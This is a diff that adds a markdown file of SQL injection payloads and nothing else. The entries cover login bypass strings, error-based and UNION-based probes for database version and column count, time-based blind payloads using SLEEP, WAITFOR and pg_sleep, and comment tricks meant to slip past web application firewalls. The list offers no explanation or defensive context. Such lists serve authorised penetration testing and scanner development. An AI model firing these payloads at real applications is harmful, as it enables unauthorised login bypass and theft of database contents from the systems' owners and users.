@@ -1,0 +1,29 @@
+# Comprehensive SQLi Payloads
+
+## 1. Authentication Bypass
+' OR '1'='1
+' OR 1=1--
+1' OR '1'='1'--
+admin' --
+admin' #
+
+## 2. Error-Based
+' or 1=1 in (select @@version)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x23,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+## 3. Time-Based / Blind
+1' WAITFOR DELAY '0:0:5'--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vYlz'='vYlz
+pg_sleep(5)
+pg_sleep(5)--
+1) OR SLEEP(5) AND (1)=(1
+
+## 4. UNION-Based Probes
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,@@version,NULL--
+
+## 5. No-Spaces (WAF Bypass)
+'/**/OR/**/1=1--
+'OR'1'='1'
+'OR(1=1)--
